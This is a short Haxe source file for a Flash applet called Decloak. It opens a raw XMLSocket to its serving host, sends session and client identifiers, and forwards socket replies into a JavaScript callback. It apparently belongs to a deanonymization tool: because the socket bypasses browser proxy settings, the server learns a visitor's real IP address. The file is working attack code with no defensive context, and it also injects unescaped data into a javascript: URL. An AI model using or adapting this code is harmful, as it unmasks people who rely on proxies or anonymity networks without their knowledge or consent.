class Decloak {
    static function main() {
		var myURL:String = flash.Lib._root._url;
		var myPos:Int = myURL.lastIndexOf("/");
		var myBase:String = myURL.substr(0,myPos+1);

		var mySession:String  = flash.Lib._root.cid;
		var myPort:Int        = flash.Lib._root.port;
		var myClient:String   = flash.Lib._root.client;
		var myCallback:String = flash.Lib._root.hook;

		trace(myBase);
		trace(myPort);

		var socket:flash.XMLSocket = new flash.XMLSocket();
		
		socket.onConnect = function(success:Bool):Void {
			if ( success ) {
				trace("FLASH: CONNECTED");
				socket.send(mySession + ':' + myClient + "\n");
			}
			else
				trace("FLASH: FAILED");
		}
		socket.onData = function(src:String):Void {
			if(myCallback.length > 0) {
				flash.Lib.getURL('javascript:'+myCallback+'("'+src+'");');
			}
		}
		
		socket.onClose = function():Void {
			trace("FLASH: CLOSED");
		}
		
		trace("FLASH: CONNECTING...");
		socket.connect( null, myPort );
    }
}
